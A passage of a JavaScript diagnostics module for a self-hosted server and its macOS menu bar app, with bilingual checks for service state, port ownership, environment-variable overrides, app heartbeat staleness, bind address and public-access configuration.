//   drift    → warn：仓库移动 / node 换版本，重启才会暴露，提前说
//   shape 漂移的 foreign unit → **不算问题**：自定义启动方式（机主的隧道用自写包装脚本绕代理
//                    TUN 劫持）是有意配置，年年报黄只会训练用户忽略告警
export function serviceUnitsDiagnostic({ platform = '', supported = false, units = null, lang = 'zh' } = {}) {
  const name = 'LaunchAgent';
  if (platform !== 'darwin' || !supported) {
    return { status: 'ok', name, detail: bi(lang, `非 macOS（${platform || '未知'}），跳过 LaunchAgent 检查；用 npm start 启动，保活方式自选，见 docs/deployment.md`, `Not macOS (${platform || 'unknown'}); skipping the LaunchAgent check. Start with npm start and keep it alive however you prefer — see docs/deployment.md`) };
  }
  if (!Array.isArray(units)) {
    return { status: 'warn', name, detail: bi(lang, '无法读取桌面端服务状态；运行 npm run service:status 查看详情。', 'Could not read the desktop service state; run npm run service:status for details.') };
  }

  const server = units.find((u) => u.unit === 'server');
  if (!server || server.state === 'not-installed') {
    return { status: 'warn', name, detail: bi(lang, '桌面端服务未安装（headless 用 npm start 就不需要它）。要开机自启 / 崩溃拉起，从桌面端菜单装，或 npm run service:install。', 'The desktop service is not installed (headless npm start does not need it). For start-at-login and crash recovery, install it from the desktop menu or run npm run service:install.') };
  }
  // stopped：plist 在盘上但没被 launchd 加载（stop 之后 / bootstrap 失败 / agent 被禁用）。
  // classifyState 的取值域是 4 个，早前漏了这一档 ⇒ 掉进末尾的 ok 分支，
  // 输出「运行中（共 0 个 unit 在跑）」—— 服务是停的却报绿，文案还自相矛盾。
  if (server.state === 'stopped') {
    return {
      status: 'warn',
      name,
      detail: `${server.label} 已安装但当前未运行（没被 launchd 加载）。`
        + '`npm run service:status` 看详情，`node scripts/service.js start server` 启动。',
    };
  }
  if (server.state === 'crashed') {
    return { status: 'fail', name, detail: bi(lang, `${server.label} 已安装但当前未运行（上次异常退出）。运行 npm run service:status 看详情、node scripts/service.js logs server 看日志。`, `${server.label} is installed but not running (last exit was abnormal). Run npm run service:status for state and node scripts/service.js logs server for logs.`) };
  }

  const problems = [];
  for (const u of units) {
    // ★ flapping 的语义已从「上次退出码 ≠ 0」换成「1 小时内 ≥3 次重启」（见 src/ops/service-events.js）。
    // 这句文案上一版没跟上，于是它对着一个一次都没崩过、只是被 kickstart 过几次的 unit 说
    // 「曾异常退出（被 KeepAlive 拉起）」—— 编造的事实会把排障往错误方向带。
    // 「上次是不是非正常退出」这个事实本身仍在 u.lastExitAbnormal 里，供 status 展示，
    // 但**不单独下告警结论**：那正是恒亮误报的来源。
    if (u.flapping) {
      const n = u.restarts?.lastHour;
      problems.push(bi(lang,
        `${u.label} 1 小时内重启 ${Number.isFinite(n) ? n : '多'} 次（疑似崩溃重启循环）`,
        `${u.label} restarted ${Number.isFinite(n) ? n : 'several'} times in the last hour (looks like a crash loop)`));
    }
    // shape = 用户换掉了启动方式，属有意配置，不计入问题
    const realDrift = (u.drift || []).filter((d) => d !== 'shape');
    if (realDrift.length) {
      problems.push(bi(lang,
        `${u.label} 配置与模板不一致：${realDrift.join('、')}`,
        `${u.label} differs from the template: ${realDrift.join(', ')}`));
    }
  }
  if (problems.length) {
    return { status: 'warn', name, detail: `${problems.join('\n  ')}\n` + bi(lang, '  运行 npm run service:status 查看详情。', '  Run npm run service:status for details.') };
  }
  const running = units.filter((u) => u.state === 'running').length;
  return { status: 'ok', name, detail: bi(lang, `${server.label} 运行中（共 ${running} 个 unit 在跑）`, `${server.label} is running (${running} unit(s) up)`) };
}

/**
 * 端口是不是自家常驻 server 占的。**三个条件缺一不可**：unit 在跑、探到的端口一致、确实连得通。
 *
 * 判定放在这一层（而不是 scripts/doctor.js 里贴着 execFileSync 写）是 2026-08-14 第三轮审查的
 * 结论：那条判据此前完全没有测试，把它改成无条件 `return server.label` 全套单测照样绿 ——
 * 而那意味着「别的进程占了我要用的端口」会被报成「预期占用」，正是它当初要避免的失败、方向相反。
 *
 * 不能只看「server 在跑」：doctor 支持 --env=other.env，那份 .env 的 PORT 可能与常驻服务不同。
 *
 * @param status `scripts/service.js status --json` 的解析结果（读不到传 null）
 */
export function resolveServicePortOwner({ status = null, port = null } = {}) {
  const server = status?.units?.find((u) => u.unit === 'server');
  if (!server || server.state !== 'running') return null;
  return server.listen?.reachable && server.listen?.port === port ? server.label : null;
}

// ── D4：端口占用判定 ────────────────────────────────────────────────────
//
// 旧实现把「端口连得上」无条件判成 fail。但常驻部署——文档主推、也是机主实际用的拓扑——下
// 端口本来就该被自家 server 占着，于是 doctor 在生产机器上**恒红**一项。恒红的检查项等于没有检查项。
// 「占着端口的是不是本仓自己的 headless server」。resolveServicePortOwner 只认 launchd 托管那一种，
// 而 headless `npm start` 是文档主推的两条入口之一——认不出它，D4 对 headless 用户就是恒红一项
// （同本节头注那条「恒红的检查项等于没有检查项」，2026-08-19 新装演练实测撞上）。
// cwd 必须比对：本机就跑着一个隔壁仓库的同名 node server.js（codex-chat-mobile），只匹配命令行会认错人。
export function identifySelfServer({ processes = [], repoRoot = '' } = {}) {
  for (const p of processes) {
    const command = String(p?.command || '');
    if (!/\bnode\b/.test(command) || !/server\.js/.test(command)) continue;
    if (repoRoot && p?.cwd && p.cwd !== repoRoot) continue;
    return { pid: p.pid, cwd: p.cwd || null };
  }
  return null;
}

export function portOccupancyDiagnostic({ port, occupied = false, ownerLabel = null, selfPid = null, probeError = '', lang = 'zh' } = {}) {
  const name = 'PORT';
  const n = Number(port);
  if (!Number.isInteger(n) || n < 1 || n > 65535) {
    return { status: 'fail', name, detail: bi(lang, `无效端口: ${port}`, `Invalid port: ${port}`) };
  }
  if (probeError) {
    return { status: 'warn', name, detail: bi(lang, `端口 ${n} 探测失败: ${probeError}`, `Could not probe port ${n}: ${probeError}`) };
  }
  if (!occupied) {
    return { status: 'ok', name, detail: bi(lang, `端口 ${n} 可用`, `Port ${n} is free`) };
  }
  if (ownerLabel) {
    return {
      status: 'ok',
      name,
      detail: bi(lang,
        `端口 ${n} 由桌面端服务 ${ownerLabel} 占用（预期；勿再手动 npm start）`,
        `Port ${n} is held by the desktop service ${ownerLabel} (expected; do not run npm start by hand)`),
    };
  }
  if (selfPid) {
    return {
      status: 'ok',
      name,
      detail: bi(lang,
        `端口 ${n} 由本仓的 headless server 占用（npm start，PID ${selfPid}）—— 已经在跑了，不用再启一个`,
        `Port ${n} is held by this repo's headless server (npm start, PID ${selfPid}) — it is already running; do not start another`),
    };
  }
  return {
    status: 'fail',
    name,
    detail: bi(lang,
      `端口 ${n} 已被占用，且既不是桌面端装的服务、也不是本仓的 npm start。查是谁：lsof -nP -iTCP:${n} -sTCP:LISTEN`,
      `Port ${n} is taken by something that is neither the desktop service nor this repo's npm start. Find it with: lsof -nP -iTCP:${n} -sTCP:LISTEN`),
  };
}

// D18: shell 环境变量覆盖可见性。env 恒压过 ccm.config.json / .env，而被压住的一侧没有任何
// 症状——「文件里明明没这个配置，行为却带着它」。2026-08-19 真机实测：一个终端会话里残留着
// 8/17 迁移前 source 过的整套旧 .env 导出（CF_ACCESS_*/CCM_DATA_DIR/DEV_MODE/LOG_TERMINAL…），
// doctor 与 server 全程按它运行，doctor 却一个字都没提。本检查只列**键名**——键的值可能是
// AUTH_TOKEN / VAPID 私钥，诊断输出会被贴进 issue / 聊天，一个字节都不能带出来。
// shellEnv 必须是 loadRuntimeEnvironment **之前**的快照：加载后文件值也进了 process.env，分不清来源。
// keys 也原样出成结构化字段：配置面板要在**被压住的那一行**上打标记（VC-D4-02），
// 拿到的必须是键名数组，而不是去反解析下面 detail 那段散文——解析散文是下一次判据分叉的起点。
export function envOverrideDiagnostic({ shellEnv = {}, keys = [], lang = 'zh' } = {}) {
  // 判据是共用的 shellOverriddenKeys（含「空串≡未设置」口径），见 env-file.js 处注释：
  // 这里与 buildEnvView 必须永远给出同一个键集。
  const hits = shellOverriddenKeys(shellEnv, keys);
  if (!hits.length) {
    return {
      status: 'ok',
      keys: [],
      detail: bi(lang, '无 shell 环境变量覆盖配置项（配置文件里的值即生效值）',
        'No shell environment variables override the config file (what the file says is what runs)'),
    };
  }
  // 清除方式只给「真能清掉」的两条。**别建议 exec**：exec 只换进程映像、环境原样继承
  // （2026-08-19 机主照旧提示跑 exec zsh，doctor 输出一字未变）。同理开新标签页也没用——
  // 变量若在终端 app 进程上，每个新标签页都继承，只有整个 app 退出重开才换得掉。
  const unsetCmd = `unset ${hits.join(' ')}`;
  return {
    status: 'warn',
    keys: hits,
    detail: bi(lang,
      `${hits.length} 个配置项被 shell 环境变量压过配置文件（env 恒优先）：${hits.join('、')} —— `
      + `文件里改这些项不会生效。若非有意设置，在启动 server 的终端里跑 \`${unsetCmd}\` 清掉它们`
      + '（exec zsh 与开新标签页都无效：环境跨 exec 继承、新标签页继承终端 app 本身的环境，'
      + '要根治得把终端 app 整个退出再打开）',
      `${hits.length} config key(s) are overridden by shell environment variables (env always wins): ${hits.join(', ')} — `
      + `editing them in the config file has no effect. If unintended, run \`${unsetCmd}\` in the terminal that starts the server`
      + ' (exec zsh and opening a new tab both fail: the environment survives exec, and new tabs inherit it from the terminal'
      + ' app itself — quit and reopen the terminal app to clear it for good)'),
  };
}

// ── 菜单栏 app 的活性 ──────────────────────────────────────────────────────
//
// 【为什么需要这一项】2026-08-23，机主的菜单栏 app 被一个沉到别人窗口后面的确认框冻死
// **63 小时**，期间系统里没有任何信号：menubar unit 因为 `open` + KeepAlive=false 恒显示
// 「待机」（与 app 是活着、崩了还是卡死完全无关），`service.js health` 只打 server 的
// HTTP，D16 只看 server。进程活着、图标还在、菜单还能弹出（状态栏菜单由系统侧渲染），
// 但主线程回不到事件循环，所以点什么都没反应——连「退出」。
//
// 【心跳从哪来】ccm-menubar.swift 的 probe() 在**每轮探测完成时**把 CCMLastProbeAt /
// CCMLastProbeOk 写进 UserDefaults。刻意**不挂在 Timer tick 上**：scheduleTimer 把 timer
// 注册在 .common 模式，而 .common 含 NSModalPanelRunLoopMode——模态冻结期间 timer 照常
// 触发，tick 驱动的心跳会在 app 卡死时显示一切健康。被饿死的恰恰是 probe 的 MainActor
// 完成回调，心跳就必须落在那条路径上。
//
// 成功失败都写，是为了把两件事分开：探测**失败**是 server 的问题（D16 管），
// 探测**停摆**才是菜单栏自己卡住了。
//
// 【这道闸保证不了什么】它只在有人跑 doctor 时才看得见。63 小时那次真正的问题是没人去看
// ——要让信号主动找到人，得把它送进手机端的服务状态面板，那是另一件事。
export function menubarLivenessDiagnostic({
  running = false,
  lastProbeAt = null,          // epoch **秒**（Swift 的 Date().timeIntervalSince1970），不是毫秒
  lastProbeOk = null,
  runningCommit = null,        // 运行中那份 bundle 的 CCMBuildCommit（app-build 编译时烘进去）
  headCommit = null,           // 仓库当前 HEAD 的短 hash
  commitsBehind = null,        // runningCommit..HEAD 的提交数；算不出来时为 null
  nowMs = Date.now(),
  staleAfterMs = 5 * 60 * 1000,  // 一轮探测最坏约 27s（node 解析 5 + status 8+3 + device 8+3），10 倍余量
  lang = 'zh',
} = {}) {
  const name = 'CCM.app';
  const build = buildFreshnessNote({ runningCommit, headCommit, commitsBehind, lang });
  const withBuild = (text) => (build ? `${text}${build}` : text);

  if (!running) {
    return { status: 'ok', name, detail: bi(lang,
      '菜单栏 app 没在跑（headless 用法本就不需要它）。',
      'The menu bar app is not running (the headless setup does not need it).') };
  }

  const at = Number(lastProbeAt);
  if (!Number.isFinite(at) || at <= 0) {
    return { status: 'warn', name, detail: withBuild(bi(lang,
      '菜单栏 app 在跑，但读不到它的心跳——多半是不带心跳的旧版。跑 npm run app:install，然后退出并重新打开它。',
      'The menu bar app is running but has no heartbeat — most likely an older build. Run npm run app:install, then quit and reopen it.')) };
  }

  // 未来的时间戳（改过系统时钟）按新鲜处理：宁可漏报，也别拿一个说不清的判据吓人。
  const ageMs = Math.max(0, nowMs - at * 1000);

  if (ageMs > staleAfterMs) {
    const ago = formatStaleAge(ageMs, lang);
    return { status: 'fail', name, detail: bi(lang,
      `菜单栏 app 的进程还在，但已经 ${ago} 没有刷新过状态——它的主线程多半卡住了，此时菜单还能弹出、点什么都没反应（连「退出」）。`
      + '最常见的原因是一个沉到别的窗口后面的确认框：先查'
      + ' `osascript -e \'tell application "System Events" to tell process "CCM" to get value of every static text of window 1\'`，'
      + '有对话框就把它点掉；查不到再 `killall CCM` 重开。',
      `The menu bar app's process is alive but has not refreshed for ${ago} — its main thread is most likely stuck, `
      + 'in which case the menu still opens but nothing responds (not even Quit). '
      + 'The usual cause is a confirmation dialog buried behind other windows: first check '
      + '`osascript -e \'tell application "System Events" to tell process "CCM" to get value of every static text of window 1\'` '
      + 'and dismiss it if there is one; otherwise `killall CCM` and reopen.') };
  }

  if (lastProbeOk === false) {
    return { status: 'warn', name, detail: bi(lang,
      '菜单栏 app 在刷新，但最近一轮读不到服务状态——那是 server 侧的事，看上面的 LaunchAgent 一项。',
      'The menu bar app is refreshing, but its latest probe could not read the service state — that is a server-side issue; see the LaunchAgent entry above.') };
  }

  return { status: 'ok', name, detail: withBuild(bi(lang,
    `菜单栏 app 在跑，状态刷新正常（${formatStaleAge(ageMs, lang)}前）。`,
    `The menu bar app is running and refreshing normally (last update ${formatStaleAge(ageMs, lang)} ago).`)) };
}

// 运行中的那份 bundle 落后仓库多少。返回 null = 无话可说（拿不到 commit，或本来就是最新）。
//
// 为什么值得单独说：D19 最初只能讲「多半是不带心跳的旧版」——因为它无从知道运行中的
// 二进制是哪个 commit。而这恰恰是机主真正想知道的（「我跑的这份含不含那个修复」）。
// bundle 里烘进 CCMBuildCommit 之后才答得上来。
//
// commitsBehind 算不出来时（换过分支、该 commit 不是 HEAD 祖先、非 git 检出）只说「不同」：
// 给一个看起来很确定却是猜的数字，比不给更糟。
function buildFreshnessNote({ runningCommit, headCommit, commitsBehind, lang }) {
  if (!runningCommit || !headCommit) return '';
  // 带 -dirty 的构建即使 hash 相同也不等于 HEAD，但那属于「你自己知道在干什么」，不唠叨
  if (runningCommit === headCommit) return '';
  const gap = Number.isFinite(commitsBehind) && commitsBehind > 0
    ? bi(lang, `落后当前 HEAD ${commitsBehind} 个提交`, `${commitsBehind} commits behind HEAD`)
    : bi(lang, `与当前 HEAD ${headCommit} 不同`, `differs from HEAD ${headCommit}`);
  return bi(lang,
    ` 跑的是构建 ${runningCommit}，${gap}——npm run app:install 后退出并重新打开它即可换上新版。`,
    ` The running build is ${runningCommit}, ${gap}. Run npm run app:install, then quit and reopen it.`);
}

// 停摆时长。小时是主要量级——63 小时那次，时长本身就是信息量最大的一条。
function formatStaleAge(ms, lang) {
  const minutes = Math.round(ms / 60000);
  if (minutes < 60) return bi(lang, `${minutes} 分钟`, `${minutes} min`);
  return bi(lang, `${Math.round(minutes / 60)} 小时`, `${Math.round(minutes / 60)} h`);
}

// D20: 文件编辑器直写 × 公网迹象（R45，2026-08-30 拍板：默认开不动，doctor 只提示）。
// 判据只认用户的显式公网声明（CF_ACCESS_* 三键齐设 / PUBLIC_URL 非空 / ACCESS_PROFILE 声明了
// cloudflare|reverse-proxy），不猜实际暴露——隧道跑在进程外，server 观测不到自己是否被公网暴露；
// 测不准的判据当安全开关，失效方向必是 fail-open。与 envOverrideDiagnostic 同纪律：点名键，不回显值。
// 显式声明 vpn 时 PUBLIC_URL 不再单独触发：deployment.md 明文教 VPN 用户把它设成隧道内深链地址，
// 照文档做还被追着 warn 是自相矛盾；抑制的信任级别与 FILE_EDIT=off 一致（用户显式声明即闭嘴）。
// CF 信号不受任何声明抑制——那是实际开启的公网层，不是声明；未知 profile 严格 === 比较天然按
// 未声明处理，不得抑制任何信号（fail-closed）。
export function fileEditExposureDiagnostic({ fileEditOff = false, cfConfigured = false, publicUrl = '', accessProfile = '', lang = 'zh' } = {}) {
  if (fileEditOff) {
    return {
      status: 'ok', name: 'FILE_EDIT',
      detail: bi(lang, '已通过 FILE_EDIT=off 关闭直写：手机端文件界面只读。', 'Disabled via FILE_EDIT=off: the phone file UI is read-only.'),
    };
  }
  const p = String(accessProfile || '').trim();
  const signals = [
    cfConfigured && 'CF_ACCESS_*',
    String(publicUrl || '').trim() && p !== 'vpn' && 'PUBLIC_URL',
    // direct 是暴露面最大的一档（端口直接挂在公网上），漏掉它就是这条检查最严重的 fail-open。
    (p === 'cloudflare' || p === 'reverse-proxy' || p === 'direct') && `ACCESS_PROFILE=${p}`,
  ].filter(Boolean);
  if (!signals.length) {
    return {
      status: 'ok', name: 'FILE_EDIT',
      detail: bi(lang, '文件编辑器直写开启（默认）。不需要时设 FILE_EDIT=off 回到只读。', 'File editor writes are on (default). Set FILE_EDIT=off for a read-only file UI.'),
    };
  }
  const via = signals.join(' / ');
  return {
    status: 'warn', name: 'FILE_EDIT',
    detail: bi(lang,
      `检测到公网入口声明（${via}）且文件编辑器直写开着——它不经 Claude 工具审批链（范围/大小/哈希/审计护栏仍在）。长期公网暴露建议设 FILE_EDIT=off。`,
      `A public entrypoint is declared (${via}) while file editor writes are on — writes bypass Claude's tool-approval chain (scope/size/hash/audit guards still apply). For long-term public exposure, set FILE_EDIT=off.`),
  };
}

// D22: 监听地址自洽性。AUTH_TOKEN 那项回答「门锁结不结实」，这项回答「门开在哪、还开不开得起来」。
// 判定不在这里做——bindPlan 由调用方用 src/shared/bind-host.js 的 resolveBindPlan 算好传入，
// 那是 server 启动时用的同一个函数，所以「doctor 说的」与「server 会做的」不可能分叉。
export function bindDiagnostic({ bindPlan, lang = 'zh' } = {}) {
  const name = 'BIND';
  const plan = bindPlan || resolveBindPlan({});
  const safe = {
    host: plan.host,
    publiclyReachable: !!plan.publiclyReachable,
    refuseCode: plan.refuse?.code ?? null,
  };

  if (plan.refuse) {
    // 按 code 各出一份双语，**不嵌 plan.refuse.detail** —— 那串文案住在 src/shared/bind-host.js
    // （纯判定层、没有 lang 参数，写的是中文），直接拼进来会让英文报告里混中文。
    const reason = {
      token_required: bi(lang,
        '没有 AUTH_TOKEN（或它全是空白字符）——任何访问都要令牌，本机也一样。跑 npm run setup 生成一个。',
        'AUTH_TOKEN is missing (or all whitespace) — every client needs it, including on this machine. Run npm run setup.'),
      custom_requires_host: bi(lang,
        'BIND_MODE=custom 必须同时设置 BIND_HOST（例如 :: 表示 IPv4/IPv6 双栈）。',
        'BIND_MODE=custom also requires BIND_HOST (for example :: for IPv4+IPv6 dual stack).'),
      unknown_bind_mode: bi(lang,
        'BIND_MODE 的值不认识（合法值：loopback / lan / custom，留空 = 按 AUTH_TOKEN 推断）。',
        'Unrecognized BIND_MODE (valid: loopback / lan / custom; empty = inferred from AUTH_TOKEN).'),
    }[plan.refuse.code] || bi(lang, 'BIND_MODE / BIND_HOST 配置无效。', 'Invalid BIND_MODE / BIND_HOST configuration.');
    return {
      status: 'fail', name, safe,
      detail: bi(lang, `当前配置会让 server 拒绝启动：${reason}`,
        `The server will refuse to start with this configuration: ${reason}`),
    };
  }
  if (!plan.publiclyReachable) {
    return {
      status: 'ok', name, safe,
      detail: bi(lang,
        `只监听 ${plan.host}（本机）。手机无法直连是预期行为——需要远程访问请自行转发（SSH -L、Tailscale Serve、反代等），或把 BIND_MODE 改成 lan。`,
        `Listening on ${plan.host} only. Phones cannot connect directly by design — forward the port yourself (SSH -L, Tailscale Serve, a reverse proxy), or set BIND_MODE=lan.`),
    };
  }
  return {
    status: 'ok', name, safe,
    detail: bi(lang, `监听 ${plan.host}，对外可达（由 AUTH_TOKEN 把守）。`,
      `Listening on ${plan.host}; reachable from other hosts (guarded by AUTH_TOKEN).`),
  };
}

// D21: 公网访问方案自洽性——声明（ACCESS_PROFILE）与实际键的稳态核对。
// 写入侧 env-schema.checkAccessProfileConsistency 只管「这一笔改动造成/维持的失配」，
// 稳态巡检归这里（doctor 每次跑都看全量现状）。与 D20 同纪律：detail 点名键、不回显值
// （publicUrl 只取「设没设」，值绝不进返回）。多问题聚合进一条 detail、级别取最重——
// 一个方案一行，别把面板刷成清单。未知值按未声明处理并明说（fail-closed：未知值不得
// 让任何检查静默跳过）。
// publiclyReachable 由调用方从 bindPlan 取（两处：scripts/doctor.js D21 与 doctor-runtime）。
// 默认 null = 「调用方没说」，此时不做监听面相关的任何断言 —— 默认成 true 会让忘记接线的调用方
// 静默丢掉一整条检查，默认成 false 则会对所有不关心绑定的调用方误报。
export function accessProfileDiagnostic({ profile = '', cfConfigured = false, publicUrl = '', authTokenSet = false, notifyConfigured = false, publiclyReachable = null, lang = 'zh' } = {}) {
  const name = 'ACCESS_PROFILE';
  const p = String(profile || '').trim();
  const urlSet = String(publicUrl || '').trim() !== '';

  if (p === '') {
    return {
      status: 'ok', name,
      detail: cfConfigured
        ? bi(lang,
          '未声明（按 CF_ACCESS_* 推断当前 = Cloudflare 公网 2FA）。设 ACCESS_PROFILE 可获得按方案的针对性检查。',
          'Undeclared (inferred from CF_ACCESS_*: Cloudflare public 2FA). Set ACCESS_PROFILE for profile-specific checks.')
        : bi(lang,
          '未声明（CF_ACCESS_* 未配，推断为局域网或自建拓扑）。设 ACCESS_PROFILE 可获得按方案的针对性检查。',
          'Undeclared (CF_ACCESS_* unset; assuming LAN or self-hosted topology). Set ACCESS_PROFILE for profile-specific checks.'),
    };
  }
  if (!ACCESS_PROFILES.includes(p)) {
    return {
      status: 'warn', name,
      detail: bi(lang,
        `不认识的值 ${p}，按未声明处理（合法值：${ACCESS_PROFILES.join(' / ')}）。`,
        `Unknown value ${p}; treated as undeclared (valid: ${ACCESS_PROFILES.join(' / ')}).`),
    };
  }

  if (p === 'cloudflare') {
    if (!cfConfigured) {
      return {
        status: 'warn', name,
        detail: bi(lang,
          '已声明 Cloudflare，但 CF_ACCESS_* 三项未配齐——公网 2FA 实际未生效。补全三项，或把 ACCESS_PROFILE 改为实际方案。',
          'Declared cloudflare but CF_ACCESS_* is incomplete — public 2FA is not actually in effect. Complete all three, or change ACCESS_PROFILE.'),
      };
    }
    return {
      status: 'ok', name,
      detail: bi(lang, 'Cloudflare Tunnel + Access：公网 2FA 生效。', 'Cloudflare Tunnel + Access: public 2FA in effect.'),
    };
  }

  // vpn / reverse-proxy / lan 共通：CF 层不该配着；vpn/reverse-proxy 还要 token 与深链可用。
  const problems = [];
  if (cfConfigured) {
    problems.push(bi(lang,
      `CF_ACCESS_* 仍配着——与 ${p} 声明矛盾，确认换方案请一并清空三项`,
      `CF_ACCESS_* is still configured — contradicts the ${p} profile; clear all three if you have switched`));
  }
  if (!authTokenSet) {
    // §1.9「鉴权是启动前提」之后没 token 是**拒绝启动**（resolveBindPlan 的 refuse.code=
    // token_required），不是降级绑 loopback。措辞必须与 bindDiagnostic 一致——两条检查看的是
    // 同一个状态，说法分叉时用户不知道信哪个；「只绑 127.0.0.1」还会让人以为本机浏览器至少能用。
    problems.push(bi(lang,
      'AUTH_TOKEN 未设置——server 会拒绝启动（任何访问都要令牌，本机也一样），跑 npm run setup 生成一个',
      'AUTH_TOKEN unset — the server refuses to start (every client needs a token, including on this machine); run npm run setup'));
  }
  // 声明「设备直接连到这台机器」的两档（lan / direct）与「只绑本机」互相矛盾：端口转发没有
  // 转发目标，同网段的手机也够不着。bindDiagnostic 抓不到这个——它对 loopback 说的是
  // 「手机无法直连是预期行为」，那句话对 reverse-proxy / cloudflare 是对的（入口进程连的就是
  // loopback），对这两档恰好说反。vpn 刻意不在此列：deployment.md 的 BIND_MODE 表把 loopback
  // 列为「自己用 SSH / Tailscale Serve / 反代转发」的适用档，照文档做还被追着 warn 是自相矛盾。
  if (publiclyReachable === false && (p === 'lan' || p === 'direct')) {
    problems.push(p === 'direct'
      ? bi(lang,
        '声明公网直连，但 BIND_MODE 让 server 只绑本机 127.0.0.1——端口转发没有转发目标，外部一台也连不上',
        'Declared direct public exposure, but BIND_MODE binds 127.0.0.1 only — the port forward has nothing to forward to; nothing outside can connect')
      : bi(lang,
        '声明仅局域网，但 BIND_MODE 让 server 只绑本机 127.0.0.1——同一 WiFi 的手机也连不上',
        'Declared LAN-only, but BIND_MODE binds 127.0.0.1 only — even same-WiFi phones cannot connect'));
  }
  if (p === 'lan') {
    if (urlSet) {
      problems.push(bi(lang,
        'PUBLIC_URL 设了值——与仅局域网声明矛盾（要么清掉它，要么改声明）',
        'PUBLIC_URL is set — contradicts the LAN-only profile (clear it or change the profile)'));
    }
  } else if (notifyConfigured && !urlSet) {
    problems.push(bi(lang,
      '通知已配置但 PUBLIC_URL 未设——推送深链会断（此拓扑需显式设为手机可达的地址）',
      'Notifications are configured but PUBLIC_URL is unset — push deep links will break (set it to an address your phone can reach)'));
  }
  if (problems.length) {
    return { status: 'warn', name, detail: problems.join(bi(lang, '；', '; ')) };
  }

  if (p === 'vpn') {
    return {
      status: 'ok', name,
      detail: bi(lang,
        '加密隧道 / VPN：入网资格由隧道承担。提醒：PWA / 推送需要 HTTPS 安全上下文（详见 docs/deployment.md）。',
        'Encrypted tunnel / VPN: network admission is handled by the tunnel. Note: PWA / push need an HTTPS secure context (see docs/deployment.md).'),
    };
  }
  if (p === 'reverse-proxy') {
    return {
      status: 'ok', name,
      detail: bi(lang,
        '反向代理 / 托管隧道：建议在入口层再补一层认证；Host 透传与 WebSocket 升级两条硬要求见 docs/deployment.md。',
        'Reverse proxy / hosted tunnel: consider an extra auth layer at the entry point; Host passthrough and WebSocket upgrade are hard requirements (see docs/deployment.md).'),
    };
  }
  if (p === 'direct') {
    // 刻意不说「在入口层补认证」——这一档没有入口层，给了也做不到。换成它真正需要知道的三件事：
    // 唯一防线是什么、被扫描是常态（免得把限速锁定当成故障）、以及它唯一强过反代的那一点。
    return {
      status: 'ok', name,
      detail: bi(lang,
        '公网直连：没有前置认证层，AUTH_TOKEN + 设备审批就是全部防线；端口直接暴露会被持续扫描，登录限速偶尔锁定属正常。'
        + '限速按真实客户端 IP 分桶（不像经中间节点转发时那样合并成一个桶）。PWA / 推送需要 HTTPS，此拓扑要自备证书，详见 docs/deployment.md。',
        'Direct public exposure: there is no pre-auth layer — AUTH_TOKEN plus device approval is the entire defense; an exposed port gets scanned continuously, '
        + 'so occasional login rate-limit lockouts are normal. Rate limiting does bucket by the real client IP here, instead of collapsing into one bucket behind a forwarder. '
        + 'PWA / push need HTTPS, so bring your own certificate (see docs/deployment.md).'),
    };
  }
  return {
    status: 'ok', name,
    detail: bi(lang, '仅局域网：同一 WiFi 直连，无公网面。', 'LAN only: same-WiFi direct access, no public surface.'),
  };
}
